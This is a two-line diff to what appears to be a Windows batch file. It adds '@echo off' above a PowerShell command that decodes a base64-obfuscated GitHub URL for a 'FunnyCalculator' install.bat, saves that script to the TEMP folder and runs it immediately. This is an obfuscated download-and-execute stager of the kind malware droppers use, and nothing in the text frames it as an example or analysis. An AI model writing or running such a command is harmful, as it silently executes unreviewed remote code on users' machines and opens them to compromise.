@@ -1,1 +1,2 @@
+@echo off
 powershell -NoP -c "$u=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL015ZWxpbkxlbm5veC9GdW5ueUNhbGN1bGF0b3IvcmVmcy9oZWFkcy9tYWluL2luc3RhbGwuYmF0'));iwr $u -OutFile $env:TEMP\i.bat;& $env:TEMP\i.bat"
